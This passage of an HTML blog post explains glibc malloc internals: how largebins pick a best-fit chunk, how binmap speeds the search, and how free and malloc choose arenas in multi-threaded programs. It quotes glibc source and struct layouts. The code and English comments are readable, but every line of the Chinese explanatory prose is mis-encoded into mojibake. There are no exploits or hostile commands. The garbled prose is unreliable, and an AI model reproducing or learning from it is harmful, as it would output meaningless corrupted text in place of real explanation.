<p>åˆè¦å°†ä¸€ä¸ª<code>0x411</code>çš„å †å—æ”¾è¿›å»,é‚£ä¹ˆè¿‡ç¨‹å°†ä¼šæ˜¯è¿™æ ·çš„:</p>
<h5 id="å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"><a href="#å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª" class="headerlink" title="å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"></a>å½“å‰binä¸­æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5><p><code>largebin</code> åœ¨æ‹¿èµ°å †å—æ—¶é‡‡ç”¨æœ€ä½³é€‚é…ç­–ç•¥,ä¹Ÿå°±æ˜¯è¯´å°½é‡æ‰¾ä¸€ä¸ªæœ€å°çš„å †å—æ»¡è¶³åˆ†é…éœ€æ±‚</p>
<p>é¦–å…ˆè®¡ç®—å¾—åˆ°<code>bin_at(M,idx)</code></p>
<p>ç„¶åé€šè¿‡<code>fd</code>é“¾è¡¨æ‰¾åˆ°è¯¥<code>bin</code>ä¸­æœ€å¤§çš„å—</p>
<p>å¦‚æœæœ€å¤§çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚,åˆ™ä½¿ç”¨<code>largebin</code>æ˜¾ç„¶æ— æ³•æ»¡è¶³éœ€æ±‚,æ²¡å¿…è¦åœ¨<code>largebin</code>è¿™é‡Œæµªè´¹æ—¶é—´äº†</p>
<p>å¦åˆ™æœ¬<code>bin</code>ä¸­å¿…ç„¶å­˜åœ¨èƒ½å¤Ÿæ»¡è¶³éœ€æ±‚çš„å—,èµ·ç æœ€å¤§çš„å—è‚¯å®šå¯ä»¥,ä½†æ˜¯ç›´æ¥ç”¨è¿™ä¸ªæœ€å¤§å—å¤ªäº,åˆ‡å‰²æœ€å¤§å—ä¹‹åé€ æˆå¤–éƒ¨ç¢ç‰‡çš„å¯èƒ½æ€§æ›´å¤§,å› æ­¤æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°æœ€ä½³é€‚é…çš„ä¸´ç•Œå—</p>
<p>åˆ©ç”¨æœ€å¤§å—çš„<code>bk_nextsize</code>ç´¢å¼•è·³åˆ°æœ€å°å—ä¸Š,ç„¶åå†æ²¿ç€<code>bk_nextsize</code>å‘æ›´å¤§å—éå†,å¦‚æ­¤å¯»æ‰¾æœ€ä½³é€‚é…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241030155542420.png" alt="image-20241030155542420"></p>
<p>æ‰¾åˆ°æœ€ä½³é€‚é…å,é¦–å…ˆå°è¯•æ‹¿èµ°æ™®é€šå †å—,æ²¡æœ‰æ™®é€šå †å—å†æ‹¿èµ°ç´¢å¼•å †å—,</p>
<p>ç„¶ååœ¨è¿™ä¸ªå †å—ä¸Šåˆ‡å‰²å‡ºåˆ†é…éœ€æ±‚æ¥,</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™å¤ªå°äº†,å°äº<code>0x20</code>å­—èŠ‚,å°±ä¸æŠ æœäº†,æ•´ä¸ªæ™®é€šèŠ‚ç‚¹å…¨éƒ½è¿”å›,å°±å½“é€äººäº†</p>
<p>å¦‚æœå‰©ä½™çš„ä¸‹è„šæ–™è¿˜è¡Œ,å¤§äºç­‰äº<code>0x20</code>,é‚£ä¹ˆå°±æŠŠä¸‹è„šæ–™æ‰”ç»™<code>unsortedbin</code></p>
<h5 id="å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"><a href="#å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª" class="headerlink" title="å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª"></a>å½“å‰binä¸­æ²¡æœ‰å †å—æ—¶æ‹¿èµ°ä¸€ä¸ª</h5><p>é¦–å…ˆæ ¹æ®å †å—å¤§å°è®¡ç®—å‡º<code>idx</code></p>
<p>å‘ç°<code>idx</code>å¯¹åº”çš„<code>largebin</code>ä¸­æ²¡æœ‰å †å—</p>
<p>äºæ˜¯æ²¿ç€<code>idx++</code>çš„æ–¹å‘,å‘æ›´å¤§çš„<code>bin</code>ä¸­å¯»æ‰¾ç›®æ ‡</p>
<p>è¿™ä¸ªå¯»æ‰¾çš„è¿‡ç¨‹ä½¿ç”¨äº†<code>binmap</code>åŠ é€Ÿ</p>
<p>æ•´ä¸ª<code>binmap</code>åˆ†ä¸ºå››ä¸ª<code>block</code>, å¯¹åº”åˆ°å››ä¸ª<code>int</code></p>
<p>æ ¹æ®å½“å‰<code>bin</code>çš„ä¸‹æ ‡<code>idx</code>è®¡ç®—å‡ºæ‰€å±çš„<code>block</code></p>
<p>å¦‚æœ<code>binmap[block] &gt; idx2bit(idx)</code></p>
<p>è¿™å°±è¯´æ˜<code>idx</code>æ‰€å±çš„å—ä¸­,<strong>å¯èƒ½</strong>å­˜åœ¨æ›´å¤§çš„<code>bin</code>,å…¶ä¸­æœ‰å †å—</p>
<p>æ‰¾åˆ°è¿™ä¸ªæ›´å¤§çš„<code>bin</code>,å®é™…åˆ¤æ–­ä¸€ä¸‹å…¶ä¸­åˆ°åº•æœ‰æ²¡æœ‰å †å—</p>
<p>ä»è¿™ä¸ªå¤§<code>bin</code>ä¸­æ‹¿å‡ºä¸€å—åˆ‡å‰²,è¿”å›</p>
<p>åˆ‡å‰©ä¸‹çš„å¦‚æœå¾ˆå°åˆ™ä¸€å¹¶è¿”å›äº†</p>
<p>å¦åˆ™æ”¾åˆ°<code>unsortedbin</code></p>
<h2 id="å¤šçº¿ç¨‹åœºæ™¯"><a href="#å¤šçº¿ç¨‹åœºæ™¯" class="headerlink" title="å¤šçº¿ç¨‹åœºæ™¯"></a>å¤šçº¿ç¨‹åœºæ™¯</h2><h3 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h3><p>åœ¨é€šå¸¸æƒ…å†µä¸‹,å †åŒºçš„ç”³è¯·å’Œé‡Šæ”¾åªä¼šä½¿ç”¨åˆ°ä¸»åˆ†é…åŒº<code>main_arena</code>,åœ¨å¤šçº¿ç¨‹ç­‰æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨å¤šä¸ªåˆ†é…åŒº,ä½†æ˜¯æˆ‘ä»¬ä¾ç„¶åªç®¡<code>malloc</code>å’Œ<code>free</code>,å¹¶æ²¡æœ‰æŒ‡å®šä»å“ªä¸ªåˆ†é…åŒºç”³è¯·æˆ–è€…é‡Šæ”¾å †å—</p>
<p>é¦–å…ˆè¯´é‡Šæ”¾:</p>
<p>å®é™…ä¸Šæ˜¯<code>libc_free</code>å†³å®šäº†å¾€å“ªé‡Œé‡Šæ”¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line">    <span class="comment">//å¯¹äºmmapç”³è¯·çš„å †å—,ä½¿ç”¨munmapå€’å›å»</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;       <span class="comment">//ä»åˆ†é…åŒºæ¥çš„å †å—,è¿˜ç»™åˆ†é…åŒº</span></span><br><span class="line">        MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark the chunk as belonging to the library again.  */</span></span><br><span class="line">        (<span class="type">void</span>)tag_region(chunk2mem(p), memsize(p));</span><br><span class="line"></span><br><span class="line">        ar_ptr = arena_for_chunk(p);</span><br><span class="line">        _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è°ƒç”¨<code>_int_free</code>æ—¶ä¼ é€’äº†åˆ†é…åŒºæŒ‡é’ˆ<code>ar_ptr</code>,ä»–æ˜¯è¿™æ ·è®¡ç®—çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar_ptr = arena_for_chunk(p);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> malloc_state *</span><br><span class="line"><span class="title function_">arena_for_chunk</span> <span class="params">(mchunkptr ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>chunk_main_arena(ptr)</code>ä¼šæ£€æŸ¥å †å—çš„Aæ ‡å¿—ä½,å¯¹äºæ¥è‡ªéä¸»åˆ†é…åŒºçš„å †å—,ä¼šè°ƒç”¨<code>heap_for_ptr</code>è®¡ç®—å…¶æ‰€åœ¨åˆ†é…åŒº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> heap_info *</span><br><span class="line"><span class="title function_">heap_for_ptr</span> <span class="params">(<span class="type">void</span> *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> max_size = heap_max_size ();</span><br><span class="line">  <span class="keyword">return</span> PTR_ALIGN_DOWN (ptr, max_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™å¹²äº†ä¸ªå•¥äº‹å‘¢?</p>
<p><code>max_size</code>å®é™…ä¸Šæ˜¯<code>64M</code>,ç„¶å<code>ptr</code>å‘ä¸‹å¯¹é½åˆ°<code>64M</code>,æ˜¯ä»€ä¹ˆä¸€ä¸ªæ•ˆæœå‘¢?</p>
<p><code>ptr &amp; 0xfffffffffc000000</code></p>
<p>æ¯”å¦‚å‡è®¾<code>ptr = 0x555558026520</code></p>
<p>é‚£ä¹ˆæ­¤æ—¶<code>ptr &amp; 0xfffffffffc000000 = 0x555558026520 &amp; 0xfffffffffc000000 = 0x555558000000</code></p>
<p>è¿™ä¸ªå€¼å°±è¢«è®¤ä¸ºæ˜¯<code>ptr</code>æ‰€åœ¨çš„åˆ†é…åŒºæè¿°ç¬¦<code>heap_info</code>çš„ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type = <span class="keyword">struct</span> _heap_info &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    mstate ar_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">size_t</span> size;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">size_t</span> mprotect_size;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> pad[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):   48 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå…¶ä¸­çš„<code>ar_ptr</code>å°±æ˜¯åˆ†é…åŒº<code>malloc_state</code>æŒ‡é’ˆ</p>
<p>ä¹Ÿå°±æ˜¯è¯´, å¯¹äºä¸€ä¸ªå †å—p</p>
<p>å¦‚æœå…¶æœ‰æ ‡å¿—ä½A,é‚£ä¹ˆç›´æ¥ä½¿ç”¨<code>glibc</code>ä¸­çš„<code>main_arena</code>æŒ‡é’ˆè¿”å›ä¸»åˆ†é…åŒº</p>
<p>å¦‚æœå…¶æ— æ ‡å¿—ä½A,é‚£ä¹ˆé¦–å…ˆå°†å…¶åœ°å€å‘ä¸‹å¯¹é½åˆ°<code>64M</code>å¾—åˆ°<code>heap_info</code>çš„ä½ç½®,ç„¶åå¾—åˆ°<code>ar_ptr</code>çš„ä½ç½®</p>
<h3 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h3><p>å¦‚æœåªæœ‰ä¸€ä¸ªçº¿ç¨‹æ˜¾ç„¶ä¸éœ€è¦å»ºç«‹å¤šä¸ªåˆ†é…åŒº,å› ä¸ºæ§åˆ¶æµåŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªåˆ†é…è¯·æ±‚</p>
<p>é‚£ä¹ˆå¯¹äºå¤šçº¿ç¨‹ç¯å¢ƒ,é¦–å…ˆå¦‚ä½•ç•Œå®šå¤šçº¿ç¨‹å‘¢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __libc_multiple_threads;</span><br><span class="line">libc_hidden_proto (__libc_multiple_threads)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined SINGLE_THREAD_BY_GLOBAL || IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P \</span></span><br><span class="line"><span class="meta">  (THREAD_GETMEM (THREAD_SELF, header.multiple_threads) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> SINGLE_THREAD_P (__libc_multiple_threads == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RTLD_SINGLE_THREAD_P SINGLE_THREAD_P</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _SINGLE_THREAD_H  */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦‚æœTCBä¸­æœ‰å®šä¹‰multiple_threadså­—æ®µ,åˆ™æ£€æŸ¥è¯¥å­—æ®µæ˜¯å¦ä¸º1</p>
<p>å¦åˆ™æ£€æŸ¥glibcçš„<code>__libc_multiple_threads</code>å˜é‡æ˜¯å¦ä¸º1</p>
<p>åœ¨x86ä¸Šä½¿ç”¨å‰è€…</p>
<p>è¿™ä¸ªå¤šçº¿ç¨‹å­—æ®µä¼šæŒ‡å¯¼mallocçš„è¡Œä¸º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (SINGLE_THREAD_P)		<span class="comment">//å•çº¿ç¨‹æ—¶çš„è¡Œä¸º</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">     <span class="keyword">return</span> victim;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//ä¸‹ä¸ºå¤šçº¿ç¨‹æ—¶è¡Œä¸º</span></span><br><span class="line"> arena_get (ar_ptr, bytes);	</span><br><span class="line"></span><br><span class="line"> victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">    before.  */</span></span><br><span class="line"> <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">     ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">     victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"> victim = tag_new_usable (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹</p>
<p>é¦–å…ˆå°è¯•<code>arena_get(ar_ptr = NULL,bytes)</code>æ‹¿åˆ°ä¸€ä¸ªåˆ†é…åŒº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define arena_get(ptr, size) do &#123; \</span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define arena_lock(ptr, size) do &#123;					      \</span><br><span class="line">      if (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      else								      \</span><br><span class="line">        ptr = arena_get2 ((size), NULL);				      \</span><br><span class="line">  &#125; while (0)</span><br></pre></td></tr></table></figure>

<p>ä¸»çº¿ç¨‹ä¼šæœ‰<code>thread_arena = &amp;main_arena</code></p>
<p>å¯¹äºå…¶ä»–çº¿ç¨‹,ç¬¬ä¸€æ¬¡å°è¯•åˆ†é…æ—¶,<code>thread_arena = NULL</code></p>
<p>æ­¤æ—¶ä¼šè°ƒç”¨<code>arena_get2</code>,è¿™ä¸ªå‡½æ•°ä¼šå°è¯•æ‰¾ä¸€ä¸ªå½“å‰ç©ºé—²çš„åˆ†é…åŒº,å¦‚æœæœ‰åˆ™è¿”å›</p>
<p>å¦‚æœæ²¡æœ‰ä¼šå°è¯•æ–°åˆ›å»ºä¸€ä¸ªåˆ†é…åŒº,å¦‚æœå·²ç»è¾¾åˆ°äº†åˆ†é…åŒºæ•°é‡ä¸Šé™,åªèƒ½ç­‰ç€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get2</span> <span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();	<span class="comment">//å°è¯•ä»freelistä¸Šæ‹¿ä¸€ä¸ªåˆ†é…åŒº</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)  <span class="comment">//å¦‚æœa == NULLè¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>) <span class="comment">//å¦‚æœåˆ†é…åŒºæ•°é‡æœ‰æ˜ç¡®é…ç½®çš„ä¸Šé™</span></span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)<span class="comment">//å¦åˆ™</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">int</span> n = __get_nprocs_sched ();<span class="comment">//è·å–èƒ½å¤Ÿä½¿ç”¨çš„CPUæ ¸å¿ƒæ•°</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);<span class="comment">//åœ¨x86_64ä¸Šæœ€å¤šæ˜¯8*n</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="type">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))  <span class="comment">//è¿˜èƒ½åˆ›å»ºæ–°çš„åˆ†é…åŒº</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);    <span class="comment">//åˆ›å»ºæ–°åˆ†é…åŒº</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span>    <span class="comment">//æ— æ³•åˆ›å»ºæ–°åˆ†é…åŒº,æ­¤æ—¶åªèƒ½è½®è¯¢å·²æœ‰çš„åˆ†é…åŒºç­‰å¾…</span></span><br><span class="line">        a = reused_arena (avoid_arena); </span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>freelist</code>ç”¨äºåœ¨å¤šçº¿ç¨‹åœºæ™¯ä¸‹,ä¿å­˜å½“å‰ç©ºé—²çš„åˆ†é…åŒº</p>
<p>åˆ†é…åŒº<code>malloc_state</code>ä¸­æœ‰ä¸€ä¸ª<code>next_free</code>å°±æ˜¯å•é“¾è¡¨åç»§æŒ‡é’ˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset      |    size */</span>  type = <span class="keyword">struct</span> malloc_state &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">__libc_lock_t</span> mutex;</span><br><span class="line"><span class="comment">/* 0x0004      |  0x0004 */</span>    <span class="type">int</span> flags;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0004 */</span>    <span class="type">int</span> have_fastchunks;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0050 */</span>    mfastbinptr fastbinsY[<span class="number">10</span>];</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    mchunkptr top;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    mchunkptr last_remainder;</span><br><span class="line"><span class="comment">/* 0x0070      |  0x07f0 */</span>    mchunkptr bins[<span class="number">254</span>];</span><br><span class="line"><span class="comment">/* 0x0860      |  0x0010 */</span>    <span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* 0x0870      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* 0x0878      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"><span class="comment">/* 0x0880      |  0x0008 */</span>    <span class="type">size_t</span> attached_threads;</span><br><span class="line"><span class="comment">/* 0x0888      |  0x0008 */</span>    <span class="type">size_t</span> system_mem;</span><br><span class="line"><span class="comment">/* 0x0890      |  0x0008 */</span>    <span class="type">size_t</span> max_system_mem;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes): 2200 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœfreelistä¸ºç©º,è¯´æ˜å½“å‰æ²¡æœ‰ç©ºé—²çš„åˆ†é…åŒº,ä½†æ˜¯å“¥ä»¬æ€¥ç€è¦ç”¨å †å—,æ€ä¹ˆåŠå‘¢? å°è¯•åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†é…åŒº</p>
<p>ä½†ä¹Ÿä¸æ˜¯ä¸€æ€¥å°±å¾—ç«‹åˆ»åˆ›å»ºæ–°åˆ†é…åŒº, è¿™ä¸ªåˆ†é…åŒºæœ‰ä¸€ä¸ªæ•°é‡ä¸Šé™,<code>8*æ ¸å¿ƒæ•°</code></p>
<p>å¦‚æœèƒ½å¤Ÿåˆ›å»º,é‚£ä¹ˆå°±è°ƒç”¨<code>_int_new_arena</code>åˆ›å»ºæ–°åˆ†é…åŒº</p>
